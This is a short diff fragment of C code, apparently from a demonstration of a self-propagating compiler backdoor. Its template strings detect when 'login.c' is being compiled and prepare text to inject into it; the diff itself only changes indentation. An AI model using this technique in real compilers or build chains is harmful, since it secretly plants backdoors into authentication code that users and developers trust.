@@ -81,7 +81,7 @@ int main(int argc, char *argv[]){
 
 
 	const char * TEXT_INJECT_COMPILER = ""
-	"const char * TEXT_INJECT_LOGIN = %c%s%c;%c%c"
+	   "const char * TEXT_INJECT_LOGIN = %c%s%c;%c%c"
 	"%cif(strstr(sourceFilename, %clogin.c%c) != NULL){%c"
 		"%c%cchar stringToInject[200];%c"
 		"%c%csnprintf(stringToInject, 200, TEXT_INJECT_LOGIN, 34, 34, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9);%c"
